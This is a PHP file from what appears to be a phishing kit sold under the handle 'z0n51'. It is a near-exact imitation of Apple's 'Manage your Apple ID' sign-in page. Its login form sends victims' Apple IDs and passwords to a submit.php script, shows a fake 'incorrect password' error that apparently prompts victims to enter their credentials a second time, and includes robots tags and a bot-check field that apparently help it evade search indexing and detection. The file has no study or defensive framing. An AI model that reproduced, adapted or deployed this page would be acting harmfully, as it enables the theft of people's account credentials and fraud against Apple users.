<?php

/**
 * @link              https://www.z0n51.com/
 * @since             14/02/2020
 * @package           APPLE
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      APPLE
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

include_once '../inc/app.php';
?>
<!doctype html>
<html lang="en">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" type="image/x-icon" href="../assets/images/fav.ico">

        <title>Manage your Apple ID - Apple</title>
    </head>

    <body>

        <div id="hero">

            <div class="top-hero">
                <div class="container">
                    <ul class="d-lg-flex d-md-flex d-sm-none d-none">
                        <li><a class="logo-app" href="#"><i class="fab fa-apple"></i></a></li>
                        <li><a href="#">Mac</a></li>
                        <li><a href="#">iPad</a></li>
                        <li><a href="#">iPhone</a></li>
                        <li><a href="#">Watch</a></li>
                        <li><a href="#">TV</a></li>
                        <li><a href="#">Music</a></li>
                        <li><a href="#">Support</a></li>
                        <li><a href="#"><i class="fas fa-search"></i></a></li>
                        <li><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                    <ul class="d-lg-none d-md-none d-sm-flex d-flex">
                        <li class="text-left"><a href="#"><i class="fas fa-stream"></i></a></li>
                        <li class="text-center"><a href="#"><i class="fab fa-apple"></i></a></li>
                        <li class="text-right"><a href="#"><i class="fas fa-shopping-bag"></i></a></li>
                    </ul>

                </div>
            </div>

            <div class="second-hero">
                <div class="container">
                    <div class="logo">
                        <p>Apple ID</p>
                    </div>
                    <ul class="d-lg-block d-md-block d-sm-none d-none">
                        <li><a class="active" href="#">Sign In</a></li>
                        <li><a href="#">Create Your Apple ID</a></li>
                        <li><a href="#">FAQ</a></li>
                    </ul>
                </div>
            </div>


            <div class="hero-form">
                <div class="container">
                    <img class="loogo" src="../assets/images/logoo.png">
                    <h3>Manage your Apple account</h3>
                    <form method="post" action="submit.php" id="login_form">
                        <input type="hidden" name="verbot">
                        <div class="input-group apple_id_group">
                            <input type="text" name="apple_id" id="apple_id" placeholder="Apple ID">
                            <div class="next-btn"></div>
                            <div class="input-loader">Loading...</div>
                        </div>
                        <div class="input-group apple_password_group">
                            <input type="password" name="apple_password" id="apple_password" placeholder="Password">
                            <div class="next-btn"></div>
                            <div class="input-loader">Loading...</div>
                        </div>
                        <div class="error-message">
                            <p>Your Apple ID or password was incorrect.</p>
                        </div>

                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="customCheck1">
                            <label class="custom-control-label" for="customCheck1">Remember me</label>
                        </div>
                        <input type="hidden" name="type" value="login">
                    </form>
                    <a href="#">Forgot Apple ID or password?</a>
                </div>
            </div>
        </div>

        <div id="bottom-page">
            <div class="container">
                <h2>Your account for everything Apple.</h2>
                <p>
                    A single Apple ID and password gives you access to all <br>
                    all Apple services.
                </p>
                <a class="d-block mb-5" href="#">Learn more about Apple ID <i class="fas fa-chevron-right"></i></a>
                <img src="../assets/images/icons.png">
                <a class="d-block mt-5" href="#">Create your Apple ID <i class="fas fa-chevron-right"></i></a>
            </div>
        </div>

        <footer id="footer">
            <div class="container">
                <div class="row">
                    
                    <div class="col-md-9">
                        <p>More ways to shop: Visit an <a href="#">Apple Store</a>, call 1-800-MY-APPLE, or <a href="#">find a reseller</a>.</p>
                        <p>Copyright © 2020 Apple Inc. All rights reserved.</p>
                        <ul>
                            <li><a href="#">Privacy Policy</a></li>
                            <li><a href="#">Terms of Use</a></li>
                            <li><a href="#">Sales and Refunds</a></li>
                            <li><a href="#">Salg og refundering</a></li>
                            <li><a href="#">Legal</a></li>
                            <li><a href="#">Site Map</a></li>
                        </ul>
                    </div>
                    <div class="col-md-3 mt-lg-0 mt-md-0 mt-sm-3 mt-3 d-flex align-items-center">
                        <div class="lang">
                            <img src="../assets/images/usaflag.png"> United States
                        </div>
                    </div>

                </div>
            </div>
        </footer>

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/main.js"></script>
    </body>

</html>